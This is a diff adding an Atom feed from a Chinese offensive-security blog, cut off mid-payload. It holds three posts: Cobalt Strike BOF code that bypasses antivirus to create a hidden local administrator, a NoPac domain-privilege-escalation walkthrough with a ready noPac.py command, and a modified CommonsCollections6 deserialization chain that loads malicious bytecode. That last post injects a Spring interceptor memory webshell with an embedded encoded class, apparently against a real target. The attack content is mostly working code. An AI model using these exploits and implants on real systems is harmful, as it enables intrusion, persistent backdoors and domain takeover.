@@ -1,0 +1,1867 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://sl3epf.github.io</id>
+    <title>秋嘞个秋</title>
+    <updated>2024-03-11T13:37:11.891Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://sl3epf.github.io"/>
+    <link rel="self" href="https://sl3epf.github.io/atom.xml"/>
+    <subtitle>弃我去者，昨日之日不可留
+&lt;br/&gt;
+乱我心者，今日之日多烦忧</subtitle>
+    <logo>https://sl3epf.github.io/images/avatar.png</logo>
+    <icon>https://sl3epf.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, 秋嘞个秋</rights>
+    <entry>
+        <title type="html"><![CDATA[[CobalStrike] BOF及cna插件开发初探]]></title>
+        <id>https://sl3epf.github.io/post/rCccLTo7M/</id>
+        <link href="https://sl3epf.github.io/post/rCccLTo7M/">
+        </link>
+        <updated>2024-01-30T05:18:23.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>主要讲下bof的代码编写和使用，具体一些原理分析可以看<br>
+https://tttang.com/archive/1786/</p>
+<h1 id="beacon-object-file">Beacon Object File</h1>
+<p>bof能够加载并执行C/C++编译后但未链接的目标obj文件(linux中的.o文件)。可以在beacon中执行内部的beaconAPI和Win32API。它的体积很小，在beacon进程内部运行，不会创建新进程，所以可以有效的规避一些EDR。</p>
+<h1 id="开发bof">开发BOF</h1>
+<h2 id="环境">环境</h2>
+<pre><code>OS: Windows 10
+IDE: VS2022
+开发模版: https://github.com/securifybv/Visual-Studio-BOF-template
+</code></pre>
+<p>将模版下载后，我们导入VS的模版目录。<br>
+<code>用户路径\文稿\Visual Studio 2022\Templates\ProjectTemplates</code><br>
+然后在新建项目中就能看到模版<br>
+<img src="https://sl3epf.github.io/post-images/1706766320417.png" alt="" loading="lazy"><br>
+然后在生成-&gt;批生成中勾选，方案配置选择BOF<br>
+<img src="https://sl3epf.github.io/post-images/1706766427206.png" alt="" loading="lazy"><br>
+然后生成，就能够在项目目录里看到obj文件<br>
+<img src="https://sl3epf.github.io/post-images/1706766538630.png" alt="" loading="lazy"></p>
+<h2 id="功能实现">功能实现</h2>
+<p>首先了解一下动态函数解析(DFR)<br>
+比如我们要获取当前用户名，在Win32API中就要调用<code>GetUserNameA</code>，我们使用DFR就是要变成如下格式</p>
+<pre><code class="language-C">DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
+</code></pre>
+<ul>
+<li>DECLSPEC_IMPORT：导入函数的关键字</li>
+<li>WINAPI：函数调用约定，一般API函数都是这个</li>
+<li>ADVAPI32：函数所在的模块名</li>
+<li>GetUserNameA：函数名称</li>
+</ul>
+<h2 id="查找当前域">查找当前域</h2>
+<p>简单实现一个查找当前域功能<br>
+修改模版中<code>Source.c</code></p>
+<pre><code class="language-C">#include &lt;windows.h&gt; 
+#include &lt;stdio.h&gt; 
+#include &lt;dsgetdc.h&gt; 
+#include &quot;beacon.h&quot; 
+
+#pragma region error_handling
+#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
+BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
+#ifdef BOF
+	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
+#else
+	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
+#endif // BOF
+
+	return FALSE;
+}
+#pragma endregion
+
+DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID);
+DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);
+
+#include &lt;LM.h&gt;
+
+#ifdef BOF
+void go(char* buff, int len) {
+    DWORD dwRet;
+    PDOMAIN_CONTROLLER_INFO pdcInfo;
+    dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &amp;pdcInfo);
+    if (ERROR_SUCCESS == dwRet) {
+        BeaconPrintf(CALLBACK_OUTPUT, &quot;%s&quot;, pdcInfo-&gt;DomainName);
+    }
+    NETAPI32$NetApiBufferFree(pdcInfo);
+}
+#else
+
+void main(int argc, char* argv[]) {
+
+}
+
+#endif
+</code></pre>
+<p><img src="https://sl3epf.github.io/post-images/1706769324737.png" alt="" loading="lazy"><br>
+于此我们也可以发现，<code>go</code>函数就是bof执行的入口，当在cs的beacon上执行<code>inline-execute</code>时就会调用<code>go</code>函数。</p>
+<h2 id="bof绕过杀毒添加用户">bof绕过杀毒添加用户</h2>
+<p>我们在cs上直接利用<code>net user</code>会被阻止<br>
+<img src="https://sl3epf.github.io/post-images/1706792395021.png" alt="" loading="lazy"><br>
+但是我们如果采用bof的方式就能够绕过<br>
+代码如下</p>
+<pre><code class="language-C">#include &lt;windows.h&gt; 
+#include &lt;stdio.h&gt; 
+#include &quot;bofdefs.h&quot;
+#include &quot;beacon.h&quot; 
+
+#pragma region error_handling
+#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
+BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
+#ifdef BOF
+	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
+#else
+	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
+#endif // BOF
+
+	return FALSE;
+}
+#pragma endregion
+
+typedef DWORD NET_API_STATUS;
+
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);
+
+#include &lt;LM.h&gt;
+
+#ifdef BOF
+void go(char* buff, int len) {
+	USER_INFO_1 UserInfo;
+
+	UserInfo.usri1_name = L&quot;Qqw666&quot;;            
+	UserInfo.usri1_password = L&quot;Qqw@#123&quot;;      
+	UserInfo.usri1_priv = USER_PRIV_USER;
+	UserInfo.usri1_home_dir = NULL;
+	UserInfo.usri1_comment = NULL;
+	UserInfo.usri1_flags = UF_SCRIPT;
+	UserInfo.usri1_script_path = NULL;
+
+	NET_API_STATUS nStatus;
+
+	//创建用户 
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
+	nStatus = NETAPI32$NetUserAdd(
+		NULL, //local server
+		1,    // information level
+		(LPBYTE)&amp;UserInfo,
+		NULL // error value
+		);
+	if (nStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Success!\n&quot;, NULL);
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Username: %ws, PassWord: %ws&quot;, UserInfo.usri1_name, UserInfo.usri1_password);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Failed! %d&quot;, nStatus);
+	}
+
+	// 添加用户到管理员组
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
+	LOCALGROUP_MEMBERS_INFO_3 account;
+	account.lgrmi3_domainandname = UserInfo.usri1_name;
+
+	NET_API_STATUS aStatus;
+
+	aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L&quot;Administrators&quot;, 3, (LPBYTE)&amp;account, 1);
+	if (aStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators success!&quot;, NULL);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators failed!&quot;, NULL);
+	}
+
+}
+#else
+
+void main(int argc, char* argv[]) {
+	go();
+}
+
+#endif
+</code></pre>
+<p>效果<br>
+<img src="https://sl3epf.github.io/post-images/1706792473981.png" alt="" loading="lazy"><br>
+可以看到成功添加用户，并且添加到管理员组。注意执行这个操作需要有admin的权限。</p>
+<h1 id="cna插件开发">CNA插件开发</h1>
+<p>具体语法可以自行网上看文章，这里我看了几个插件的写法，感觉主要的就那么几个，也比较简单<br>
+先给出C语言代码，修改了功能，可以自定义用户名和密码</p>
+<pre><code class="language-C">#include &lt;windows.h&gt; 
+#include &lt;stdio.h&gt; 
+#include &quot;bofdefs.h&quot;
+#include &quot;beacon.h&quot; 
+
+#pragma region error_handling
+#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
+BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
+#ifdef BOF
+	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
+#else
+	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
+#endif // BOF
+
+	return FALSE;
+}
+#pragma endregion
+
+typedef DWORD NET_API_STATUS;
+
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
+DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);
+
+#include &lt;LM.h&gt;
+
+#ifdef BOF
+void go(char* buff, int len) {
+	datap parser;
+
+	LPWSTR username;
+	LPWSTR password;
+
+	// 初始化datap结构体变量(parser),用于解析从Beacon接收到的字节流(buff)
+	BeaconDataParse(&amp;parser, buff, len);
+	username = (LPWSTR)BeaconDataExtract(&amp;parser, NULL);
+	password = (LPWSTR)BeaconDataExtract(&amp;parser, NULL);
+
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Extracted username: %S&quot;, username);
+	BeaconPrintf(CALLBACK_OUTPUT, &quot;Extracted password: %S&quot;, password);
+
+	USER_INFO_1 UserInfo;
+
+
+	UserInfo.usri1_name = username;
+	UserInfo.usri1_password = password;
+	UserInfo.usri1_priv = USER_PRIV_USER;
+	UserInfo.usri1_home_dir = NULL;
+	UserInfo.usri1_comment = NULL;
+	UserInfo.usri1_flags = UF_SCRIPT;
+	UserInfo.usri1_script_path = NULL;
+
+	NET_API_STATUS nStatus;
+
+	//创建用户 
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
+	nStatus = NETAPI32$NetUserAdd(
+		NULL, //local server
+		1,    // information level
+		(LPBYTE)&amp;UserInfo,
+		NULL // error value
+	);
+	if (nStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Success!&quot;, NULL);
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Username: %ws, PassWord: %ws&quot;, UserInfo.usri1_name, UserInfo.usri1_password);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Failed! %d&quot;, nStatus);
+	}
+
+	// 添加用户到管理员组
+	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
+	LOCALGROUP_MEMBERS_INFO_3 account;
+	account.lgrmi3_domainandname = UserInfo.usri1_name;
+
+	NET_API_STATUS aStatus;
+
+	aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L&quot;Administrators&quot;, 3, (LPBYTE)&amp;account, 1);
+	if (aStatus == NERR_Success) {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators success!&quot;, NULL);
+	}
+	else {
+		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators failed!&quot;, NULL);
+	}
+
+}
+#else
+
+void main(int argc, char* argv[]) {
+	go();
+}
+
+#endif
+</code></pre>
+<p>cna代码</p>
+<pre><code class="language-C">beacon_command_register(
+&quot;adduser&quot;, 
+&quot;Add a user to administrators&quot;, 
+&quot;usage: adduser [username] [password]&quot;);
+
+alias adduser{
+	local('$handle $data $args');
+
+	$uname = $2;
+	$pass = $3;
+
+	if ($uname eq &quot;&quot; or $pass eq &quot;&quot;) {
+		berror($1, &quot;usage command: help adduser&quot;);
+		return;
+	}
+
+	# 读入bof文件
+
+    $handle = openf(script_resource(&quot;source.obj&quot;));
+    $data = readb($handle, -1);
+    closef($handle);
+
+	# 打包参数两个ZZ代表两个参数
+	$args = bof_pack($1, &quot;ZZ&quot;, $uname, $pass);
+
+    # 执行bof
+     # &quot;go&quot;是BOF中的函数名，$args是传递给这个函数的参数
+	beacon_inline_execute($1, $data, &quot;go&quot;, $args);
+}
+</code></pre>
+<p>效果如下<br>
+<img src="https://sl3epf.github.io/post-images/1706802021881.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>头一回写这玩意。。。加上windows的基础不是很好，一天下来踩了好多坑。。。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[NoPac漏洞原理及利用]]></title>
+        <id>https://sl3epf.github.io/post/cM-wSyF-g/</id>
+        <link href="https://sl3epf.github.io/post/cM-wSyF-g/">
+        </link>
+        <updated>2024-01-17T10:29:07.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>利用CVE-2021-42278 &amp; CVE-2021-42287，两个漏洞组合可使域内普通用户权限提升至域管权限。</p>
+<h1 id="原理">原理</h1>
+<h2 id="cve-2021-42278">CVE-2021-42278</h2>
+<p>允许攻击者修改任意机器账户的saMAccountName字段，从而可以模拟域控申请TGT票据。<br>
+默认加入都会创建一个机器名，域中的机器账户默认以<code>$</code>结尾，saMAccountName的值默认和机器名一样。但是DC没有对saMAccountName的值进行合法性判断，删除saMAccountName后的<code>$</code>符号依然能以机器账户申请TGT票据<br>
+<img src="https://sl3epf.github.io/post-images/1705494695636.png" alt="" loading="lazy"><br>
+maq=10默认可以创建10个域机器<br>
+<img src="https://sl3epf.github.io/post-images/1705495041051.png" alt="" loading="lazy"></p>
+<h2 id="cve-2021-42287">CVE-2021-42287</h2>
+<p>创建一个普通机器账户，将其sAMAccountName改为和域控机器账户名相同但不以<code>$</code>结尾，用该账户进行TGT请求后将sAMAccountName随便修改，再用TGT去申请ST，在TGS_REP中，由于二次改名后，此时域内已经没有该账户，导致域控找不到它，协议的处理逻辑会自动在主机名后加上<code>$</code>继续搜索，结果就会搜索到域控机器账户，然后用<code>S4U2Self</code>冒充DC去请求ST，从而重新生成了带有域控权限的PAC（原本的PAC是TGS拷AS阶段中的。依然是我们创建的机器权限。）最终我们就获得了一个高权限的ST票据。</p>
+<h2 id="kerberos认证流程">Kerberos认证流程</h2>
+<p>要是不熟悉的话，这里再回顾一下Kerberos的认证流程</p>
+<ul>
+<li>1.访问服务的Client(以下表述为Client 或者用户)</li>
+<li>2.提供服务的Server(以下表述为服务)</li>
+<li>3.KDC（Key Distribution Center）密钥分发中心</li>
+</ul>
+<ol>
+<li>AS_REQ：Client使用自己的hash加密时间戳发送给kdc进行预认证请求TGT</li>
+<li>AS_REP：kdc使用Client Hash解密验证时间戳，如果正确则就返回用krbtgt hash加密的TGT票据和PAC等信息。</li>
+<li>TGS_REQ：Client使用TGT票据向KDC发起针对指定SPN服务的TGS_REQ请求</li>
+<li>TGS_REP：KDC识别spn服务，使用krbtgt hash解密TGT票据，如果解密正确则返回该服务的hash加密的ST票据</li>
+<li>AP_REQ：Client使用ST票据请求特定服务，将PAC传递给服务，然后服务通过PAC查看用户的SID和用户组等信息和服务自身的ACL进行对比，返回特定的RPC状态代码</li>
+<li>AP_REP：验证AP_REQ是否正确特定服务使用自己的hash解密，如果验证正确向KDC发送TGS票据询问该Client是否有权限访问自身服务。</li>
+</ol>
+<h2 id="关注">关注</h2>
+<h3 id="pac">PAC</h3>
+<p>PAC在其中出现的节点为AS_REP和AP_REP。在AS_REP中，KDC返回的tgt票据中包含了PAC。PAC中包含了用户的SID和用户组等信息。<br>
+在AP_REP中，服务解密验证正确后将PAC发送给KDC，KDC根据PAC的值来判断用户是否有权限访问该服务。</p>
+<h3 id="s4u2self">S4U2Self</h3>
+<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1705504175114.png" alt="" loading="lazy"></figure>
+<p>为什么要使用S4U2Self协议进行请求？这也是漏洞主要存在的原因<br>
+参考看长亭👴的从源码分析https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA<br>
+简单来说就是KDC处理S4U和非S4U请求中的PAC的方式是不同的。<br>
+当采用的不是S4U的请求，则直接从TGT的<code>AuthData</code>中提取PAC（之前在AS_REP阶段获得的）<br>
+当采用的是S4U的请求，它就会对应用户去生成一个新的PAC（我们模拟的用户是<code>Administrator</code>，所以最后能获得一个高权限的ST）。</p>
+<h1 id="复现">复现</h1>
+<h2 id="验证">验证</h2>
+<p>首先验证漏洞存在，因为漏洞补丁说明TGT中要携带PAC，而我们依然可以申请一个不带PAC的TGT<br>
+<img src="https://sl3epf.github.io/post-images/1705506188443.png" alt="" loading="lazy"><br>
+证明漏洞存在</p>
+<h2 id="利用">利用</h2>
+<p>还有一步改机器的saMAccountName为域控机器去掉$申请TGT忘记写了。<br>
+<img src="https://sl3epf.github.io/post-images/1705506843849.jpg" alt="" loading="lazy"></p>
+<h1 id="maq0如何利用">MAQ=0如何利用</h1>
+<p>CreateChild account利用<br>
+查找有该权限的账户</p>
+<pre><code>AdFind.exe -sc getacls -sddlfilter ;;&quot;[CR CHILD]&quot;;;computer; -recmute
+</code></pre>
+<p>利用-create-child</p>
+<pre><code>python noPac.py test.local/qqw:&quot;Qqw123456..&quot; -dc-ip 192.168.2.24 -dc-host dc1 -shell --impersonate administrator -use-ldap -create-child
+</code></pre>
+<h1 id="参考">参考</h1>
+<p>https://daiker.gitbook.io/<br>
+https://forum.butian.net/share/2408<br>
+https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[实战-CC6改造加载恶意字节码注入内存马]]></title>
+        <id>https://sl3epf.github.io/post/fufMcoOWa/</id>
+        <link href="https://sl3epf.github.io/post/fufMcoOWa/">
+        </link>
+        <updated>2024-01-12T14:24:56.000Z</updated>
+        <content type="html"><![CDATA[<!-- more -->
+<h1 id="前言">前言</h1>
+<p>赶了一天车，头晕晕😵‍💫<br>
+接着昨天没分析完的点继续搞</p>
+<h1 id="利用分析">利用分析</h1>
+<p>目标是某云匣子的fastjson漏洞，关于漏洞具体分析看我jack👴<br>
+<strong>https://zjackky.github.io/post/java-securityc3p0-chain-original-analysis-duplicated-20240113-17-05-58-cgbxn.html</strong></p>
+<h2 id="问题">问题</h2>
+<p>开始是简单的想到利用CC3加载恶意类，但是后面尝试发现是不行的。因为我们在CC链的时候了解过，<br>
+在jdk8u71之后，代理类<code>AnnotationInvocationHandler</code>中的<code>this.memberValues</code>被替换为了<code>linkedhashmap</code>，所以会报错没有<code>entrySet</code>键。</p>
+<h2 id="解决">解决</h2>
+<p>因为CC6是不受版本限制的，我们可以利用<code>TemplatesImpl</code>改造它<br>
+参考这个师傅 https://f4de-bak.github.io/pages/ca9de1/#%E6%94%B9%E9%80%A0cc6<br>
+具体代码为</p>
+<pre><code class="language-java">package Qiu;
+
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.*;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.keyvalue.TiedMapEntry;
+import org.apache.commons.collections.map.LazyMap;
+
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class CC6V2 {
+    public static void main(String[] args) throws Exception {
+        ClassPool pool = ClassPool.getDefault();
+        pool.appendClassPath(&quot;xxx/java/Qiu/&quot;);
+        CtClass ctClass = pool.get(&quot;EvilTest&quot;);
+        byte[] payloads = ctClass.toBytecode();
+//        byte[] payloads = Base64.getDecoder().decode();
+
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] {payloads});
+        setFieldValue(templates, &quot;_name&quot;, &quot;qiuqiu&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+        Transformer transformer = new InvokerTransformer(&quot;getClass&quot;, null, null);
+
+        Map innerMap = new HashMap();
+        Map outerMap = LazyMap.decorate(innerMap, transformer);
+
+        TiedMapEntry tme = new TiedMapEntry(outerMap, templates);
+
+        Map expMap = new HashMap();
+        expMap.put(tme, &quot;qiu&quot;);
+
+        outerMap.clear();
+
+        setFieldValue(transformer, &quot;iMethodName&quot;, &quot;newTransformer&quot;);
+//
+//        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));
+//        oos.writeObject(expMap);
+//        oos.close();
+
+        unserialize(&quot;ser.bin&quot;);
+
+    }
+
+
+    public static void setFieldValue(Object obj, String fieldName, Object
+            value) throws Exception {
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
+    }
+
+    public static Object unserialize(String file) throws IOException, ClassNotFoundException {
+//        byte[] decode = Base64.getDecoder().decode(payload);
+//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream();
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(file));
+        Object obj = ois.readObject();
+        return obj;
+    }
+}
+</code></pre>
+<p>本地搭建相关环境，在jdk8u391的环境下成功执行命令。<br>
+<img src="https://sl3epf.github.io/post-images/1705155062964.jpg" alt="" loading="lazy"><br>
+但是tmd打回显的🐎子又不行，调试了半天还是不行💢。<br>
+刚好外卖到了，边吃鸭脖边又看了两眼，发现🐎子忘记继承<code>AbstractTranslet</code>了...</p>
+<h2 id="内存马">内存马</h2>
+<p>能回显了，但是在实际攻防当中我们最好还是能够打入内存马方便操作。<br>
+考虑到目标环境是spring，我直接就找了以前的springInterceptor的内存马，</p>
+<pre><code class="language-java">import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import org.springframework.beans.BeansException;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.context.request.ServletRequestAttributes;
+
+import javax.servlet.ServletRequest;
+import javax.servlet.http.HttpServletRequest;
+import java.lang.reflect.Method;
+
+public class SpringInterceptorMemShell extends AbstractTranslet {
+    static String b64 = &quot;yv66vgAAADQBSAoAZQCFCACGCQBkAIcIAIgJAGQAiQgAigkAZACLCgBkAIwJAI0AjggAjwoAkACRCACSCwCTAJQIAJUKABMAlgoAEwCXCQCYAJkIAJoHAJsIAJwIAJ0IAJ4IAJ8HAKAKAKEAogoAoQCjCgCkAKUKABgApggApwoAGACoCgAYAKkLAKoAqwoArACRCwCTAK0LAJMArggArwgAsAsAkwCxBwCyCgAnAIUIALMKACcAtAgAtQgAtggAtwsAuAC5CAC6CgC7ALwHAL0HAL4KADIAhQsAuAC/CgAyAMAIAMEKADIAwgoAMgDDCgATAMQKADEAxQoAuwDGBwDHCgA8AIULAJMAyAoAyQDKCgA8AMsKALsAzAgAzQoARQDOCADPBwDQBwDRCQDSANMKAEUA1AoA1QDWCgBMANcKAEUA2AcA2QoA0gDaCgDVANsKAEUA3AoATACWCADdBwDeCgBSAN8KAOAA4QoA4ADiCADjCgBbAOQJAGQA5QcA5ggA5wcA6AcA6QoAXADfBwDqCgBeAN8HAOsKAGAA3wcA7AoAYgDfBwDtBwDuAQASbXlDbGFzc0xvYWRlckNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBABBiYXNpY0NtZFNoZWxsUHdkAQASTGphdmEvbGFuZy9TdHJpbmc7AQATYmVoaW5kZXJTaGVsbEhlYWRlcgEAEGJlaGluZGVyU2hlbGxQd2QBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQAJcHJlSGFuZGxlAQBkKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTtMamF2YS9sYW5nL09iamVjdDspWgEADVN0YWNrTWFwVGFibGUHAJsHAO8HAPAHAN4BAApFeGNlcHRpb25zAQAKaW5pdGlhbGl6ZQcA7QcA6AcA5gcA8QcA6QcA6gcA6wcA7AEAClNvdXJjZUZpbGUBAB9EeW5hbWljSW50ZXJjZXB0b3JUZW1wbGF0ZS5qYXZhAQAZUnVudGltZVZpc2libGVBbm5vdGF0aW9ucwEAK0xvcmcvc3ByaW5nZnJhbWV3b3JrL3N0ZXJlb3R5cGUvQ29udHJvbGxlcjsMAGwAbQEABHBhc3MMAGgAaQEADFgtT3B0aW9ucy1BaQwAagBpAQAQZTQ1ZTMyOWZlYjVkOTI1YgwAawBpDAB4AG0HAPIMAPMA9AEAIlsrXSBEeW5hbWljIEludGVyY2VwdG9yIHNheXMgaGVsbG8HAPUMAPYA9wEABHR5cGUHAPgMAPkA+gEABWJhc2ljDAD7APwMAP0A/gcA/wwBAABpAQABLwEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAANjbWQBAAIvQwEAEWphdmEvdXRpbC9TY2FubmVyBwEBDAECAQMMAQQBBQcBBgwBBwEIDABsAQkBAAJcQQwBCgELDAEMAQ0HAQ4MAQ8BEAcBEQwBEgD6DAETAQ0BAARQT1NUAQAGUWl1UUl1DAEUARUBABFqYXZhL3V0aWwvSGFzaE1hcAEAB3JlcXVlc3QMARYBFwEACHJlc3BvbnNlAQAHc2Vzc2lvbgEAAXUHARgMARkBGgEAA0FFUwcA7wwBGwEcAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEdAR4MAR8BIAEAAAwBHwEhDAEiAQ0MASMBJAwAbAElDAEmAScBABZzdW4vbWlzYy9CQVNFNjREZWNvZGVyDAEoASkHASoMASsBDQwBLAEtDAEuAS8BABVqYXZhLmxhbmcuQ2xhc3NMb2FkZXIMATABMQEAC2RlZmluZUNsYXNzAQAPamF2YS9sYW5nL0NsYXNzAQACW0IHATIMATMAZwwBNAE1BwDxDAE2ATcMATgBOQwBOgE7AQAQamF2YS9sYW5nL09iamVjdAwBPAE9DAE+AT8MAUABQQEAB1FpdVlZRFMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAFCAG0HAUMMAUQBRQwBRgE7AQAnY29tLmZlaWhvbmcubGRhcC50ZW1wbGF0ZS5NeUNsYXNzTG9hZGVyDAFHATEMAGYAZwEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQMceXY2NnZnQUFBRElBR3dvQUJRQVdCd0FYQ2dBQ0FCWUtBQUlBR0FjQUdRRUFCanhwYm1sMFBnRUFHaWhNYW1GMllTOXNZVzVuTDBOc1lYTnpURzloWkdWeU95bFdBUUFFUTI5a1pRRUFEMHhwYm1WT2RXMWlaWEpVWVdKc1pRRUFFa3h2WTJGc1ZtRnlhV0ZpYkdWVVlXSnNaUUVBQkhSb2FYTUJBQ2xNWTI5dEwyWmxhV2h2Ym1jdmJHUmhjQzkwWlcxd2JHRjBaUzlOZVVOc1lYTnpURzloWkdWeU93RUFBV01CQUJkTWFtRjJZUzlzWVc1bkwwTnNZWE56VEc5aFpHVnlPd0VBQzJSbFptbHVaVU5zWVhOekFRQXNLRnRDVEdwaGRtRXZiR0Z1Wnk5RGJHRnpjMHh2WVdSbGNqc3BUR3BoZG1FdmJHRnVaeTlEYkdGemN6c0JBQVZpZVhSbGN3RUFBbHRDQVFBTFkyeGhjM05NYjJGa1pYSUJBQXBUYjNWeVkyVkdhV3hsQVFBU1RYbERiR0Z6YzB4dllXUmxjaTVxWVhaaERBQUdBQWNCQUNkamIyMHZabVZwYUc5dVp5OXNaR0Z3TDNSbGJYQnNZWFJsTDAxNVEyeGhjM05NYjJGa1pYSU1BQThBR2dFQUZXcGhkbUV2YkdGdVp5OURiR0Z6YzB4dllXUmxjZ0VBRnloYlFrbEpLVXhxWVhaaEwyeGhibWN2UTJ4aGMzTTdBQ0VBQWdBRkFBQUFBQUFDQUFBQUJnQUhBQUVBQ0FBQUFEb0FBZ0FDQUFBQUJpb3J0d0FCc1FBQUFBSUFDUUFBQUFZQUFRQUFBQVFBQ2dBQUFCWUFBZ0FBQUFZQUN3QU1BQUFBQUFBR0FBMEFEZ0FCQUFrQUR3QVFBQUVBQ0FBQUFFUUFCQUFDQUFBQUVMc0FBbGtydHdBREtnTXF2cllBQkxBQUFBQUNBQWtBQUFBR0FBRUFBQUFJQUFvQUFBQVdBQUlBQUFBUUFCRUFFZ0FBQUFBQUVBQVRBQTRBQVFBQkFCUUFBQUFDQUJVPQEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24BACBqYXZhL2xhbmcvSWxsZWdhbEFjY2Vzc0V4Y2VwdGlv